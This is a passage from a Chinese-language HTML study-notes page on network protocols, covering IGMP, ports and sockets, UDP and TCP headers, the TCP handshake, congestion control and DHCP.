/><p>由于D类地址的组标识字段长为28bit，将低23位复制到多播MAC地址中，有5bit未使用，所以<strong>映射是多对一的</strong>。</p><p><strong>32个多播IP地址映射到一个以太网多播地址</strong>。既然地址映射不是惟一的，那么设备驱动程序或lP层就必须对数据报进行过滤。因为网卡可能接收到主机不想接收的多播数据帧。另外，如果网卡不提供足够的多播数据帧过滤功能,设备驱动程序就必须接收所有多播数据帧，然后对它们进行过滤。</p><h3 id="IGMP协议简介："><a href="#IGMP协议简介：" class="headerlink" title="IGMP协议简介："></a>IGMP协议简介：</h3><p>IGMP ( lnternet Group Management Protocol)协议，IGMP位于网络层。</p><p style="color:orange;">IGMP协议运行于主机和主机直接相连的路由器之间，是IP主机用来报告多播组成员身份的协议</p>利用IGMP协议，一方面可以使主机通知本地路由器希望加入并接收某个特定多播组的信息;另一方面，路由器可以周期性地查询局域网内某个已知组的成员是否处于活动状态。IGMP使用预留的组播地址224.0.0.1与本地路由器通信。<h3 id="IGMP报文格式："><a href="#IGMP报文格式：" class="headerlink" title="IGMP报文格式："></a>IGMP报文格式：</h3><p>IGMP协议目前有三个版本IGMP、IGMPv2和IGMPv3。</p><p>其中IGMPv2有3种报文类型:</p><blockquote><p>查询报文:路由器查询多播组中是否有活跃成员，分为一般查询和特定查询</p><p>成员关系报告报文:加入多播组或响应查询报文。</p><p>退出报告报文:离开多播组。</p></blockquote><h4 id="IGMPv2报文格式："><a href="#IGMPv2报文格式：" class="headerlink" title="IGMPv2报文格式："></a>IGMPv2报文格式：</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/IGMPv2报文格式.png" style="zoom:67%;" /><ol><li><p>类型:定义了IGMP报文类型</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/IGMP报文类型.png" style="zoom: 80%;" /></li><li><p>响应时间:规定查询必须在多长时间内回答，以十分之一秒为单位。默认值为10秒。在查询报文中，这个值不为0，在其它报文中此字段值为0</p></li><li><p>检验和:对整个IGMP报文进行检验，算法同IP数据报</p></li><li><p>组地址:在一般查询报文中值为0。在特殊的查询报文、成员关系报告报文以及退出报文中值为相应的多播组地址</p></li></ol><h4 id="IGMP的封装"><a href="#IGMP的封装" class="headerlink" title="IGMP的封装"></a>IGMP的封装</h4><p>IGMP报文被封装在IP数据报中，IP层有3个字段需要注意:</p><blockquote><ul><li>协议类型:值为2，高层协议类型为2的IP数据包，其数据部分要交给IGMP协议处理。</li><li>生存时间:值为1，保证了这个报文不离开这个局域网。因为IGMP的作用范围是局域网，IGMP报文不能够发送到局域网以外的地方。</li><li>目的IP地址:为D类组播地址。</li></ul></blockquote><h3 id="多播组成员的加入和退出："><a href="#多播组成员的加入和退出：" class="headerlink" title="多播组成员的加入和退出："></a>多播组成员的加入和退出：</h3><h4 id="加入一个组"><a href="#加入一个组" class="headerlink" title="加入一个组"></a>加入一个组</h4><p>每个主机维护一张成员关系表，成员关系表是**&lt;进程名，组名&gt;<strong>表项的集合。当一个进程P要加入一个新组MG时，就向主机发出申请，主机就在成员关系表中增加</strong>&lt;P, MG&gt;**表项。</p><blockquote><ul><li>如果MG在表中不存在，主机就发送成员关系报告报文</li><li>如果MG在表中已经存在，那就不必发送成员关系报告报文，因为主机已经是MG这个组的成员了</li></ul></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/加入多播组.png" style="zoom:67%;" /><p>路由器也维护一个多播地址表，给出了连接到每一个接口的成员关系。如果对于这些接口中的一个组有兴趣时，路由器就发送成员关系报告报文，以记录连接在它的接口上的所有的多播组。<br>IGMP协议要求把成员关系报告报文在很短的时间内发送两次。这样，如果第一个报文丢失或受到损伤，那么第二个报文可以代替它。</p><h4 id="退出一个组"><a href="#退出一个组" class="headerlink" title="退出一个组"></a>退出一个组</h4><ol><li><p>当主机发现在一个群组MG中已经没有进程时，就发送退出报告报文，多播路由器收到该报告。当路由器发现在一个特定组中已经没有连接在它的接口上感兴趣的网络，它就发送退出这个组的报告。</p></li><li><p>多播路由器收到退出报告报文时，并不立即删除这个群组MG，而是发送针对MG的查询报文，因为这个退出群组报告仅仅是从一个站点发送来的，可能还有其他站点仍然需要这个群组。</p></li><li><p>若在指定时间内没有收到站点对该群组的成员关系报告，就意味着在本网络上没有这个群组MG的成员，删除这个群组。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/退出多播组.png" style="zoom:67%;" /></li></ol><h4 id="监视组成员关系"><a href="#监视组成员关系" class="headerlink" title="监视组成员关系"></a>监视组成员关系</h4><blockquote><ul><li>当仅有一台主机留在一个组中时，如果这台主机离开了这个组而没有发送退出报告报文，那么多播路由器将永远收不到退出报告报文，它认为这个组一直存在这个成员。</li></ul></blockquote><p>多播路由器负责监视局域网上的所有主机或路由器,多播路由器周期性地发送<strong>一般查询报文</strong>，在这个报文中，组地址被置为<strong>0.0.0.0</strong>。</p><p>路由器期望着在它的组表中的每一个组的回答，甚至新的组也可以回答。查询报文的最大响应时间是10秒。当主机路由器收到一般查询报文时，如果它对一个组感兴趣，就发送成员关系报告报文。</p><h4 id="延迟响应"><a href="#延迟响应" class="headerlink" title="延迟响应"></a>延迟响应</h4><blockquote><p style="color:blue;">IGMP使用延迟响应策略，避免不必要的通信量。当主机或路由器收到查询报文时，它不是立即响应，而是延迟响应</p></blockquote><p>主机或路由器使用一个随机数产生计时器，它的截止时间是1～10秒。截止时间可以使用1秒或更短的步长。</p><p>表中的每一个组都设置计时器。每个主机或路由器在发送成员关系报告报文之前都要等待它的计时器到时。在这段等待时间中，如果在同一组中的其它主机或路由器的计时器先到了截止时间，那么这个主机或路由器就发送成员关系报告报文。因为这个报文是广播发送的，等待的主机或路由器都能收到这个报文，并知道没有必要对这个组发送重复的报文;因此，等待的主机或路由器就取消发送成员关系报告。</p><h2 id="传输层协议TCP与UDP"><a href="#传输层协议TCP与UDP" class="headerlink" title="传输层协议TCP与UDP"></a>传输层协议TCP与UDP</h2><h3 id="进程间通信："><a href="#进程间通信：" class="headerlink" title="进程间通信："></a>进程间通信：</h3><blockquote><p style="color:orange;">点到点的通信:IP协议负责主机到主机的通信。作为网络层协议，IP协议只能把报文交付给目的主机。</p></blockquote><blockquote><p style="color:orange;">端到端的通信：运输层协议负责进程到进程的通信。TCP和UDP协议负责把报文交付到正确的进程。</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/进程间通信.png" style="zoom:80%;" /><h4 id="端口号"><a href="#端口号" class="headerlink" title="端口号:"></a>端口号:</h4><p>主机是用IP地址来标识的，而要标识主机中的进程，就需要使用端口号。TCP/IP协议族中，端口号占16 bit，用0~65535之间的整数标识。TCP和UDP是两个独立的软件模块，因此各自的端口号也相互独立。·端口号只具有本地意义，不同计算机的相同端口号是没有联系的。</p><h5 id="三类端口号："><a href="#三类端口号：" class="headerlink" title="三类端口号："></a>三类端口号：</h5><ul><li>熟知端口，数值为0~1023，用于标识服务器进程。</li><li>登记端口号，数值为1024~49151，为没有熟知端口号的服务器进程使用。使用这个范围的端口号必须在IANA登记，以防止重复。</li><li>客户端口号或短暂端口号，数值为49152~65535，留给客户进程选择暂时使用，一般由应用程序开发者指定或由操作系统随机分配一个未使用的端口号。当服务器进程收到客户进程的报文时，就知道了客户进程所使用的动态端口号。通信结束后，这个端口号可供其它客户进程使用。</li></ul><h5 id="UDP的熟知端口号："><a href="#UDP的熟知端口号：" class="headerlink" title="UDP的熟知端口号："></a>UDP的熟知端口号：</h5><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/UDP的熟知端口号.png" style="zoom:80%;" /><h5 id="套接字："><a href="#套接字：" class="headerlink" title="套接字："></a>套接字：</h5><p>为了使多主机、多进程通信时不发生混乱，必须把主机的IP地址和端口号结合起来使用，称为<strong>套接字(Socket)</strong>.</p><blockquote><p>客户套接字地址唯一地定义了客户进程;服务器套接字地址唯一地定义了服务器进程;TCP与UDP都使用套接字通信;</p></blockquote><p>套接字包括**IP地址(32位)<strong>和</strong>端口号(16位)**，共48位.进行通信的一对套接字在整个Internet中是唯一的。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/套接字.png"  /><blockquote><p style="color:orange;">面向连接的服务：进行数据交换前，先建立连接，传输结柬后释放连接</p></blockquote><ol><li>建立连接阶段:在有关协议数据单元中，须给出源用户与目的用户的完整地址，同时可协商服务质量等选项。</li><li>数据交换阶段:这个阶段，每个报文中不必包含用户完整的地址，而是使用一个连接标识符来代替。报文的发送和接收都是按顺序进行的，发送方先发送的报文，在接收方先收到。</li><li>释放连接阶段:通过相应的协议数据单元完成释放操作。</li></ol><blockquote><p style="color:orange;">无连接的服务：两个实体通信前不必先建立连接。</p></blockquote><blockquote><p>无连接服务灵活方便，但不能防止报文的丢失、重复和乱序。·每个报文必须包含完整的源地址和目的地址，因此开销较大。</p></blockquote><h3 id="用户数据报协议UDP"><a href="#用户数据报协议UDP" class="headerlink" title="用户数据报协议UDP"></a>用户数据报协议UDP</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">#掌握UDP协议的报文格式#掌握UDP协议校验和的计算方法#理解UDP协议的优缺点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="UDP协议简介："><a href="#UDP协议简介：" class="headerlink" title="UDP协议简介："></a>UDP协议简介：</h4><blockquote><p style="color:blue;">UDP (User Datagram Protocol，用户数据报协议）提供无连接的传输服务，对等的UDP实体在传输时不建立端到端的连接，只是简单地发送或接收数据报</p></blockquote><p>UDP协议直接位于IP协议的上层，属于运输层协议。<br>UDP协议不提供端到端的确认和重传功能，它不保证数据包一定能到达目的地，因此是不可靠协议，使用UDP的程序可根据自己的需求设计相应的可靠性机制，如TFTP。</p><h5 id="UDP协议的特点"><a href="#UDP协议的特点" class="headerlink" title="UDP协议的特点"></a>UDP协议的特点</h5><p>发送数据之前不需要建立连接，UDP主机不需要维持复杂的连接状态表。</p><p>UDP用户数据报只有8个字节的首部开销。<br>网络的拥塞不会使源主机的发送速率降低，这对某些实时应用是很重要的。·当数据包在传送过程中发生错误时UDP不能报告错误。<br>UDP保留应用程序定义的报文边界，当应用程序把一块数据交给UDP发送时，这块数据将作为独立的单元到达对方的应用程序，因此，应用程序必须关心IP数据报的长度。</p><h4 id="UDP报文格式："><a href="#UDP报文格式：" class="headerlink" title="UDP报文格式："></a>UDP报文格式：</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/UDP报文格式.png" style="zoom: 67%;" /><p>首部字段和数据字段。首部字段8个字节，由4个字段组成，每个字段2字节</p><ol><li>源端口:表示发送端的端口号。不同的应用程序使用不同的端口号，实现了同一时间段内多个应用程序可以一起使用网络进行数据的发送和接收。</li><li>目的端口:表示数据包被发往的目的端的端口号。</li><li>有效负载长度:包括UDP首部和UDP数据在内的整个用户数据报的长度。该字段的最小值是8，一些UDP实现将数据报的大小限制到了8192字节。</li><li>校验和:UDP的校验的校验范围包括伪首部（IP首部的部分字段)、UDP首部和UDP数据，该字段是可选的。如果该字段值为零就说明不进行校验。</li></ol><p>UDP用户数据报封装在IP数据报中，IP数据报的“协议类型”字段的值是17，表示数据部分是从UDP协议来的。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/UDP封装.png" style="zoom:67%;" /><h5 id="UDP校验和的计算"><a href="#UDP校验和的计算" class="headerlink" title="UDP校验和的计算"></a>UDP校验和的计算</h5><blockquote><p style="color:blue;">UDP校验和的计算与IP和ICMP校验和的计算不同。UDP校拉和T拉H围包括三部分:伪首部、UDP首部以及从应用层来的数据。</p></blockquote><p>伪首部是IP首部的一部分，其中有些字段要填入0。若校演和不包括伪首部，用户数据报也可能是安全的和正确的。但是，若lP首部受到损伤，则它可能被交付到错误的主机。</p><p>伪首部中的高层协议类型是为了确保这个数据报是属于UDP而不是是属丁于TCP。UDP的高层协议类型是17，若这个值在传输过程中出错，接收端就能检出并丢弃这个数据包，从而不会交付给错误的协议。</p><h4 id="UDP的应用："><a href="#UDP的应用：" class="headerlink" title="UDP的应用："></a>UDP的应用：</h4><p>UDP适用于这样的进程，它需要简单的请求—响应通信，而较少考虑流量控制和差错控制。对于需要传送成块数据的进程，如FTP，则通常不使用UDP。<br>UDP适用于具有内部流量控制和差错控制机制的进程。对多播和广播来说，UDP是个比较合适的传输层协议。UDP可用于管理进程，如SNMP协议。<br>UDP可用于某些路由选择更新协议，如RIP协议。</p><h3 id="传输控制协议TCP"><a href="#传输控制协议TCP" class="headerlink" title="传输控制协议TCP"></a>传输控制协议TCP</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 掌握TCP协议的报文格式</span><span class="token comment"># 掌握TCP连接的建立和释放过程</span><span class="token comment"># 掌握TCP数据传输中编号与确认的过程掌握TCP协议校验和的计算方法</span><span class="token comment"># 理解TCP重传机制</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="TCP协议简介："><a href="#TCP协议简介：" class="headerlink" title="TCP协议简介："></a>TCP协议简介：</h4><p>TCP协议是TCP/IP协议族中的面向连接的、可靠的、端到端的运输层协议。</p><p>TCP提供全双工服务，全双工连接包括两个独立的、方向相反的数据流。与UDP不同，TCP允许发送和接收字节流形式的数据。为了使服务器和客户端以不同的速度双向发送和接收数据，TCP提供了发送和接收两个缓冲区。TCP在报文中加上一个递增的确认序列号来告诉发送端，接收端期望收到的下一个报文，如果在规定时间内，没有收到关于这个包的确认响应，则重新发送此包，这保证了TCP是一种可靠的传输层协议。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/TCP的熟知端口号.png" style="zoom:50%;" /><h4 id="TCP报文格式："><a href="#TCP报文格式：" class="headerlink" title="TCP报文格式："></a>TCP报文格式：</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/TCP报文格式.png" style="zoom: 50%;" /><p>源端口:2字节，主机中发送这个报文的应用程序端口号。</p><p>目的端口:2字节，目的主机中接收这个报文的应用程序的端口号。</p><p>序列号:4字节，定义了指派给本报文第一个数据字节的一个序号。TCP是流式传输协议，为了保证连通性，要在发送的每一个字节上编号。序号指定了这个序列中的哪一个字节是报文的第一个字节。在连接建立时，双方使用随机数产生器产生初始序号，通常每一方的初始序号都是不同的。</p><p>确认号:4字节，接收端期望收到的下一个报文段中数据部分的第一个字节的序号。</p><p>首部长度:4位，指定TCP首部的长度，以4字节为单位。首部长度可以在20~60字节之间。因此，这个字段的值可以在5至15之间。<br>保留字段:4位，保留为今后使用，目前应置为0。<br>控制字段:定义了8种不同的标志。用在TCP的流量控制、连接建立和终止以及数据传送的方式等方面。在同一时间可设置一位或多位标志。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/TCP的控制字段.png" style="zoom:67%;" /><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/\TCP控制字段具体信息.png" style="zoom: 50%;" /><p>窗口:2字节，窗口字段用来控制对方发送的数据量，单位为字节。TCP连接的一端根据设置的缓存空间大小确定自己的接收窗口大小，然后通知对方以确定对方的发送窗口的上限。这时，发送端必须服从接收端的决定。</p><p>检验和:2字节，检验的范围包括首部和数据这两部分。在计算检验和时，要在TCP报文段的前面加上12字节的伪首部。</p><p>紧急指针:2字节，只有当URG=1时才有效，指出在本报文段中的紧急数据的最后一个字节的序号，使接收方知道紧急数据共有多少字节(紧急数据结束后是普通数据)。发送方TCP即使发送窗口为0，也要对带有URG标志的数据段实行强制发送。</p><p>选项:长度可变，最多40字节。</p><p>最大报文段长度MSS (Maximum Segment Size)。</p><blockquote><ul><li> TCP报文段中的数据字段的最大长度。</li><li> 与接收窗口值没有关系，不是考虑接收方的缓存是否可以放下TCP报文段中的数据。</li><li> 目的是提高网络的利用率，使TCP报文段携带的数据尽可能多，以提高分组中数据部分所占的比例。</li><li> MSS应该尽可能大，只要在IP层不需要进行分片即可。但由于传输路径的动态性，很难确定最佳MSS。</li><li> 连接建立时，双方把自己能够支持的MSS通知对方，默认值是536 Byte。因此所有主机都能接受的报文段长度是556 Byte。</li></ul></blockquote><p>填充:为了使整个首部长度是4字节的整数倍，全0填充。</p><h5 id="TCP的封装："><a href="#TCP的封装：" class="headerlink" title="TCP的封装："></a>TCP的封装：</h5><p>TCP报文封装在lP数据报中，IP数据报的“协议类型”字段的值是6</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/TCP的封装.png" style="zoom:67%;" /><h4 id="TCP链接的建立与释放："><a href="#TCP链接的建立与释放：" class="headerlink" title="TCP链接的建立与释放："></a>TCP链接的建立与释放：</h4><blockquote><p style="color:blue;">连接的三个阶段:连接建立、数据传送和连接释放。连接建立</p></blockquote><p>服务器首先准备接收TCP连接，这个过程叫做被动打开。这时的服务器的TCP已经准备好接受任何一台主机的TCP连接了。客户程序发出TCP请求的过程叫做主动打开。然后服务器与客户端就开始三次握手过程。</p><h5 id="三次握手建立连接："><a href="#三次握手建立连接：" class="headerlink" title="三次握手建立连接："></a>三次握手建立连接：</h5><p>1．客户发送第一个报文，这是一个SYN报文，在这个报文中只有SYN标志置为1，这个报文的作用是使序号同步。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/第一次握手.png" style="zoom:50%;" /><p>2．服务器发送第二个报文，即SYN+ACK报文，其中SYN和ACK标志被置为1首先，它是一个用来和对方进行通信的SYN报文。服务器使用这个报文同步初始序号，以便从服务器向客户发送字节。服务器还使用ACK标志确认已从客户端收到了SYN报文，同时给出期望从客户端收到的下一个序号。另外，服务器还定义了客户端要使用的接收窗口的大小。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/第二次握手.png" style="zoom:50%;" /><p>3．客户发送第三个报文。这仅仅是一个ACK报文。它使用ACK标志和确认号字段来确认收到了第二个报文。<br>然后客户端就可以通知上层应用进程，连接已经建立。服务器收到客户机的确认后，也通知上层应用进程，连接已经建立。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/第三次握手.png" style="zoom:50%;" /><h5 id="半关闭的四次握手方式终止连接："><a href="#半关闭的四次握手方式终止连接：" class="headerlink" title="半关闭的四次握手方式终止连接："></a>半关闭的四次握手方式终止连接：</h5><blockquote><p style="color:blue;">半关闭:TCP连接中，一方可以终止发送数据，但仍然保持接收数据，称为半关闭。半关闭通常是由客户端发起的。</p></blockquote><p><strong>半关闭的过程</strong></p><ol><li>客户发送FIN报文，半关闭了这个连接</li><li>服务器发送ACK报文接受了这个半关闭。但是，现在服务器仍然可以发送数据</li><li>当服务器已经把所有处理的数据都发送完毕时，就发送FIN报文</li><li>客户端发送ACK报文给予确认。<ul><li>在半关闭一条连接后，客户端仍然可以接收服务器发送的数据，而服务器也可以接收客户端发送的确认。但是，客户端不能传送数据给服务器。</li></ul></li></ol><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/半关闭的四次握手方式终止连接.png" style="zoom:50%;" /><h4 id="流量控制："><a href="#流量控制：" class="headerlink" title="流量控制："></a>流量控制：</h4><p>发送端收到接收端的确认报文之前，对发送端发送的数据量进行管理</p><p>在不考虑流量控制的情况下，传输层协议可以每次只发送一个字节的数据，然后在发送下一个字节数据之前等待接收端的确认报文。这是一个非常缓慢的过程，发送端在等待确认报文时一直处于空闲状态。<br>还有一种情况是传输层协议一次就将全部数据发送出去，而不理会确认报文。这样虽然加速了发送过程，但可能会使接收端来不及接收而瘫痪。此外，若有一部分数据丢失、重复、失序或损坏，发送端就要一直等到接收端将全部数据都检查完毕后才能知道。</p><h4 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h4><p>TCP的流量控制在缓存上定义了一个窗口，称为滑动窗口，窗口大小的单位是字节，TCP发送数据的多少由滑动窗口决定。</p><p>TCP报文段首部的窗口字段就是给发送方设置的发送窗口的上限。</p><p>发送窗口在连接建立时由双方商定，在通信过程中动态调整。</p><p>如果发送方收到接收方的窗口大小U HIr以人tx’P送数据（带URG标志的数据段除外）。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/滑动窗口.png" style="zoom:67%;" /><p>发送端只要收到了对方的确认，发送窗口就可前移。<br>发送TCP维护一个指针。每发送一个报文段，指针向前移动一个报文段的距离。</p><blockquote><p style="color:red;">滑动窗口的右沿可以向左移动吗?</p>**滑动窗口的右沿向左移动通常发生在对方通知窗口缩小时**。使某些可以发送的数据变成不能发送，如果发送端已经发送了这些数据，就会产生错误。<p>TCP标准强烈不赞成这样做。</p></blockquote><blockquote><p style="color:red;">滑动窗口的左沿可以向左移动吗?</p>**窗口的左沿不能向左移动**，因为这表示已经发送出去的并且经过确认的数据现在又要回收了</blockquote><h4 id="拥塞控制："><a href="#拥塞控制：" class="headerlink" title="拥塞控制："></a>拥塞控制：</h4><h5 id="拥塞控制与流量控制的对比"><a href="#拥塞控制与流量控制的对比" class="headerlink" title="拥塞控制与流量控制的对比:"></a>拥塞控制与流量控制的对比:</h5><blockquote><p style="color:blue;">出现资源拥塞的条件:    对资源需求的总和>可用资源</p></blockquote><ul><li>防止过多的数据注入到网络中，可以使路由器或者链路不至于过载。</li><li>拥塞控制是一个<strong>全局性</strong>的过程，涉及到所有的主机、路由器，以及与降低网络传输性能有关的所有因素。</li></ul><p><strong>流量控制：</strong>在给定的发送端和接收端之间的<strong>点对点通信量的控制</strong>。</p><ul><li>流量控制所要做的就是抑制发送端发送数据的速率，以便使接收端来得及接收</li></ul><h5 id="拥塞控制的作用："><a href="#拥塞控制的作用：" class="headerlink" title="拥塞控制的作用："></a>拥塞控制的作用：</h5><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/拥塞控制.png" style="zoom:50%;" /><h5 id="拥塞控制方法"><a href="#拥塞控制方法" class="headerlink" title="拥塞控制方法"></a>拥塞控制方法</h5><blockquote><p style="color:black;">慢开始:        初始设置拥塞窗口cwnd = 1，每收到一个对新的报文段的确认后，将拥塞窗口加1，逐步增大发送端的拥塞窗口cwnd。</p></blockquote><blockquote><p style="color:black;">拥塞避免:    使拥塞窗口cwnd按线性规律缓慢增长，“加法增大”。</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/慢开始于拥塞避免.png" style="zoom:50%;" /><blockquote><p style="color:black;">快重传:接收方每收到一个失序的报文段后就立即发出重复确认，这样做可以让发送方及早知道有报文段没有到达接收方。发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段。</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/快重传.png" style="zoom:50%;" /><blockquote><p style="color:black;">快恢复:当发送端收到连续三个重复的确认时，就执行“乘法减小”算法，把慢开始门限ssthresh 减半，但接下去不执行慢开始算法，而是执行拥塞避免算法“加法增大”，使拥塞窗口缓慢地线性增大，实现快恢复。</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/快恢复.png" style="zoom:50%;" /><h5 id="发送窗口大小"><a href="#发送窗口大小" class="headerlink" title="发送窗口大小:"></a>发送窗口大小:</h5><p>考虑拥塞控制的情况下，窗口大小由接收窗口和拥塞窗口两者中的较小者决定。接收窗口大小由接收方发送的确认报文中的窗口大小字段值所确定。这是接收端在缓存溢出导致数据被丢弃之前所能接受的最大字节数。拥塞窗口大小是由网络根据拥塞情况而确定的。<br>发送窗口的上限值= Min [rwnd, cwnd]</p><blockquote><ul><li><p>当rwnd &lt; cwnd时，是接收方的接收能力限制发送窗口的最大值</p></li><li><p>当cwnd &lt; rwnd时，则是网络的拥塞限制发送窗口的最大值。</p></li></ul></blockquote><h4 id="差错控制："><a href="#差错控制：" class="headerlink" title="差错控制："></a>差错控制：</h4><h5 id="TCP的差错控制"><a href="#TCP的差错控制" class="headerlink" title="TCP的差错控制"></a>TCP的差错控制</h5><ul><li>应用程序把数据流交付给TCP后，就依靠TCP把整个数据流交付给接收端的应用程序，并且保证数据流是按序的、没有差错的、也没有任何一部分是丢失的或重复的。</li><li>TCP使用差错控制提供可靠性。差错控制包括以下的一些机制:检测受到损伤的报文、丢失的报文、失序的报文和重复的报文。</li></ul><blockquote><p style="color:blue;">实现方式：通过校验和、确认以及超时重传三种机制实现</p></blockquote><ul><li><p>校验和:用来检验报文是否出错，如果出错，接收端就将报文丢弃</p></li><li><p>确认</p><ul><li>累积确认：不必对收到的分组逐个发送确认，而是对按序到达的最后一个分组发送确认</li><li>选择确认：首部选项SACK用于报告收到的不连续的字节块的边界</li><li>确认报文不携带数据，但消耗一个序号。除了ACK报文之外，确认报文也需要被确认。</li></ul></li><li><p>重传</p><ul><li>超时计时器到时:发送端为每一个TCP报文段都设置一个超时计时器，若计时器到时仍没收到确认，就重传这个报文。超时计时器的值是动态的，根据报文的往返时间而更新</li><li>快重传:发送端只要一连收到三个重复的ACK即可断定有报文段丢失了，就应立即重传而不必等待计时器超时。</li></ul></li></ul><h2 id="动态主机配置协议DHCP"><a href="#动态主机配置协议DHCP" class="headerlink" title="动态主机配置协议DHCP"></a>动态主机配置协议DHCP</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#掌握DHCP的报文格式</span><span class="token comment">#掌握DHCP的工作原理</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="DHCP简介："><a href="#DHCP简介：" class="headerlink" title="DHCP简介："></a>DHCP简介：</h4><blockquote><p style="color:blue;">动态主机配置协议(Dynamic Host Configuration Protocol )是一种动态指定IP地址的机制</p></blockquote><ul><li>DHCP服务器能自动为客户端分配IP地址，减少了客户机IP地址配置的复杂度和管理开销</li><li><strong>DHCP服务器</strong>是安装了DHCP服务器软件的计算机，可在网络中设置一台或多台</li></ul><p>分配给客户的IP是临时的，DHCP客户只能在有限的时间内使用该IP，这段时间称为<strong>租用期</strong><br>租用期的数值应由DHCP服务器决定(默认1小时)，DHCP客户也可在自己发送的报文中提出对租用期的要求。<br>当租期到了的时候，服务器可以把这个IP地址分配给别的主机使用。</p><blockquote><p style="color:orange;">DHCP使用UDP协议封装，使用UDP的熟知端口67和68，68是DHCP请求报文中的源端口，67是DHCP服务器的目标端口</p></blockquote><h4 id="DHCP报文格式："><a href="#DHCP报文格式：" class="headerlink" title="DHCP报文格式："></a>DHCP报文格式：</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/DHCP报文格式.png" style="zoom:50%;" /><blockquote><ol><li>操作码:1字节，表示是请求报文还是应答报文，1代表请求，2代表应答</li><li>硬件类型:1字节，表示正在使用的硬件技术的类型，1表示以太网。</li><li>硬件地址长度:1字节，如果是以太网，该字段值为6。</li><li>跳数:1字节，表示报文经过的DHCP中继的数目，请求报文每经过一个DHCP中继，该字段就加1。</li><li>事务ID:4字节，客户端发起一次请求时选择的随机数，服务器应答时返回客户同一个值，用来标识一次地址请求交互过程。</li><li>秒数:2字节，表示从客户端发出DHCP请求到现在所经过的秒数。</li><li>标志:2字节，第一个比特为广播响应标识位，用来标识dhcp服务器响应报文是采用单播还是广播发送。其余比特保留不用。</li><li>客户IP:4字节，如果客户已知道自己的IP，就写入，否则填入0。</li><li>你的IP:4字节，服务器分配给客户的IP。</li><li>服务器IP:4字节，由服务器填写，DHCP服务器的IP。</li><li>DHCP中继IP:4字节，客户发出请求后报文经过的第一个DHCP中继的IP。客户硬件地址:16字节，由客户端设置。</li><li>服务器主机名:64字节，由服务器填写。</li><li>引导文件名:由服务器为客户指定的配置文件名称。</li><li>选项:可选选项字段，包含报文的类型、有效租期、DNS服务器的IP地址、wins服务器的IP地址等配置信息，格式如下:</li></ol></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/DHCP协议封装.png" style="zoom:67%;" /><h4 id="静态地址分配与动态地址分配："><a href="#静态地址分配与动态地址分配：" class="headerlink" title="静态地址分配与动态地址分配："></a>静态地址分配与动态地址分配：</h4><h5 id="静态地址分配"><a href="#静态地址分配" class="headerlink" title="静态地址分配"></a>静态地址分配</h5><blockquote><p style="color:blue;">将物理地址与IP地址绑定在一起，DHCP服务器将这个绑定文件存放在静态数据库中。</p><p style="color:blue;">当有主机请求分配IP时，DHCP服务器首先检查静态数据库，若静态数据库存在所请求的物理地址条目，则将相应的IP地址返回给客户。</p></blockquote><h5 id="动态地址分配"><a href="#动态地址分配" class="headerlink" title="动态地址分配"></a>动态地址分配</h5><p>DHCP服务器有一个<strong>存放IP地址的数据库</strong>(IP地址池)。当客户请求临时IP地址时，DHCP服务器就查找可用的IP地址分配给客户。</p><blockquote><p style="color:orange;">从DHCP服务器获得的IP地址是临时的，服务器预设了租用时间，租用时间到期时，客户就更新租用或停止使用这个IP地址。</p></blockquote><p>服务器对更新租用可选择同意或不同意，如果不同意，客户就停止使用这个地址。</p><h4 id="DHCP状态转换"><a href="#DHCP状态转换" class="headerlink" title="DHCP状态转换"></a>DHCP状态转换</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/DHCP状态转换.png" style="zoom: 50%;" 